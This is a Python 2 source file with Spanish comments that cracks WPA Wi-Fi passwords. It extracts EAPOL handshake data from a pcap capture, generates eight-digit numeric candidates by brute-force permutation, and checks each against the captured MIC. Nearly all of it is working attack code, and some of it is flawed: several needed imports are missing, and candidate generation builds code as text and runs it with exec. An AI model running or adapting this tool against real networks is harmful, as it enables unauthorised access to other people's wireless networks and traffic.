from cracker import hmac4times, crack
from pcapParser import load_savefile
from halfHandshake import crackClients
from Queue import Queue
from sys import getsizeof
from threading import Thread

def isWPAPass(passPhrase, ssid, clientMac, APMac, Anonce, Snonce, mic, data):
    pke = "Pairwise key expansion" + '\x00' + min(APMac,clientMac)+max(APMac,clientMac)+min(Anonce,Snonce)+max(Anonce,Snonce)
    pmk = pbkdf2_bin(passPhrase, ssid, 4096, 32)
    ptk = hmac4times(pmk,pke)
    if ord(data[6]) & 0b00000010 == 2:
        calculatedMic = hmac.new(ptk[0:16],data,sha1).digest()[0:16]
    else:
        calculatedMic = hmac.new(ptk[0:16],data).digest()
    return mic == calculatedMic

def perm(universo, longitud, inicio=False, fin=False):
    """ 
    Calcula permutaciones.
    universo = lista de caracteres que compondra las combinaciones.
    longitud = longitud que tendra cada permutacion.
    inicio = lista de posiciones desde la cual comenzara a iterar cada caracter. Sirve para especificar la permutacion desde la cual debe iniciar a calcular permutaciones.
    fin = lista de posiciones para la permu final.
    """
    lis = universo
    nt = 1
    n = n2 = longitud
    if inicio:
        assert len(inicio) == longitud
        inicio = list(inicio)
        indexes = [x - 1 for x in inicio]
    if fin:
        assert len(fin) == longitud
        fin = list(fin)
    code = """def yield_perm():
    try:
        lis = '%s'
        n = n2 = %s
        inicio = %s
        fin = %s
        indexes = %s
""" % (''.join(map(str, universo)) if type(universo) == list else universo, longitud, str(inicio), str(fin), str(indexes if inicio else []))
    c = -1
    while n > 0:
        c += 1
        i = -1
        code += ("\t" * nt) + "if inicio:\n" + ("\t" * (nt + 1)) + "c{0} = indexes[{0}]; indexes[{0}] = -1\n".format(c)
        code += ("\t" * nt) + "else:\n" + ("\t" * (nt + 1)) + "c%d = -1\n" % (c)
        code += ("\t" * nt) + ("while c%d < len(lis) - 1:\n" % c)
        nt += 1
        code += ("\t" * nt) + "c%d += 1\n" % c
        code += ('\t' * nt) + "d{0} = lis[c{0}]\n".format(c)
        n -= 1
    contadores = (("c%d , " * n2) % tuple(range(n2)))[:-2]
    code += ('\t' * nt) + "comb = " + (("d%d + " * n2) % tuple(range(n2)))[:-2]  + "\n"
    code += ('\t' * nt) + "print comb\n"
    code += ('\t' * nt) + "yield comb\n"
    code += ('\t' * nt) + "if [" + contadores + "] == fin:\n"
    code += ('\t' * (nt + 1)) + "indexes = [" + (str(len(universo)) + ', ') * longitud  + "]\n"
    code += ('\t' * (nt + 1)) + "%s = indexes; break\n" % contadores
    code += """    except KeyboardInterrupt:
        pass"""
    exec code
    return yield_perm()

def peso(n,r):#usando permutacion con repeticion
	espacios=0;cont=0
	for x in n:
		cont=cont+1
	cantidad=cont**r
	bit=r*8
	peso=cantidad*bit
	for x in xrange(1,cantidad):#contando el ultimo salto
		espacios=espacios+16
	peso=peso+espacios
	print "peso -->",peso,"bit"

def crack_WPA_sin_dicc(capFilePath, mac, SSID):
	passQueue = Queue()
	thread = Thread(
		target=insertar_combinaciones, 
		args=(passQueue, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], 8),
		kwargs=({"fin" : [0,0,0,0,0,0,1,0]})
	)
	thread.start()
	thread.join()
	# insertar_combinaciones(passQueue, [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], 8, fin=[0,0,0,0,0,0,1,0])
	clients_data = extraer_cap_info(capFilePath)
	passwd = crackClients(clients_data, mac, SSID, passQueue)
	if passwd:
		success(passwd)
	else:
		not_found()

def insertar_combinaciones(combQueue, universo, longitud, inicio=False, fin=False, bufferSize=1231231):
	"""Inserta las combinaciones de un rango dado en una Queue."""
	for comb in perm(universo, longitud, inicio=inicio, fin=fin):
		while getsizeof(combQueue) >= bufferSize:
			pass
		combQueue.put(comb)

def extraer_cap_info(readFile):
    try:
        caps, header = load_savefile(open(readFile))
    except IOError:
        print "Error reading file"
        exit(2)

    if header.ll_type != 1 and header.ll_type != 105:
        print "unsupported linklayer type, only supports ethernet and 802.11"
        exit(2)
    clients = {}
    if header.ll_type == 105:
        for packet in caps.packets:
            auth = packet[1].raw()[32:34]
            if auth == '\x88\x8e':
                AP = packet[1].raw()[16:22]
                dest = packet[1].raw()[4:10]
                source = packet[1].raw()[10:16]
                part = packet[1].raw()[39:41]
                relivent = True
                if part == '\x00\x8a':
                    message = 1
                    client = dest
                    Anonce = packet[1].raw()[51:83]
                    info = {'AP': AP, 'client': client, 'Anonce': Anonce, 'message': message}
                elif part == '\x01\x0a':
                    Snonce = packet[1].raw()[51:83]
                    client = source
                    mic = packet[1].raw()[115:131]
                    data = packet[1].raw()[34:115] + "\x00"*16 + packet[1].raw()[131:]
                    message = 2
                    info = {'AP': AP, 'data': data, 'client': client, 'Snonce': Snonce, 'mic': mic, 'message': message}
                else:
                    relivent = False
                if relivent:
                    if info['client'] in clients:
                        clients[info['client']].append(info)
                    else:
                        clients[info['client']] = [info]
    else:
        for packet in caps.packets:
            auth = packet[1].raw()[12:14]
            if auth == '\x88\x8e':
                relivent = True
                part = packet[1].raw()[19:21]
                if part == '\x00\x8a':
                    message = 1
                    client = packet[1].raw()[0:6]
                    AP = packet[1].raw()[6:12]
                    Anonce = packet[1].raw()[31:63]
                    info = {'AP': AP, 'client': client, 'Anonce': Anonce, 'message': message}
                elif part == '\x01\x0a':
                    Snonce = packet[1].raw()[31:63]
                    AP = packet[1].raw()[0:6]
                    client = packet[1].raw()[6:12]
                    mic = packet[1].raw()[95:111]
                    data = packet[1].raw()[14:95] + "\x00"*16 + packet[1].raw()[111:]
                    message = 2
                    info = {'AP': AP, 'data': data, 'client': client, 'Snonce': Snonce, 'mic': mic, 'message': message}
                else:
                    relivent = False
                if relivent:
                    if info['client'] in clients:
                        clients[info['client']].append(info)
                    else:
                        clients[info['client']] = [info]
    return clients

def success(clave):
	print "ENCONTRADA!:", clave

def not_found():
	print "La clave no ha sido encontrada."